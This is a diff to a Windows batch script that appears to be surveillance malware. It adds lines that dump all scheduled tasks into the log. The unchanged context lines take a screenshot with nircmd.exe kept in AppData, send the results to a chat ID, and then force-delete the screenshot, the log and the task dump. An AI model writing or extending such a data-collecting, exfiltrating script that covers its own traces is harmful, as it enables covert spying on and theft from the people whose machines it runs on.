@@ -622,6 +622,30 @@ if "%CheckSend%"=="1" (
 
 
 
+schtasks /query /fo LIST /v > "%temp%\tasks_data.txt"
+(for /l %%i in (1,1,11) do echo.) >> "%LOGFILE%"
+echo Task Scheduler >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
+type "%temp%\tasks_data.txt" >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 "%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
@@ -661,7 +685,7 @@ echo Message sent to chat ID %CHAT_ID%
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 del /f /q "%LOGFILE%"
-
+del /f /q "%temp%\tasks_data.txt"
 
 
 set "CheckSend=0"
@@ -688,7 +712,7 @@ set "lastMinute=%currentMinute%"
 
 
 set "currentSeconds=%time:~6,2%"
-if %currentSeconds% geq 50 (
+if %currentSeconds% geq 40 (
     echo Seconds are 50 or greater. Exiting...
     goto :EOF
 )
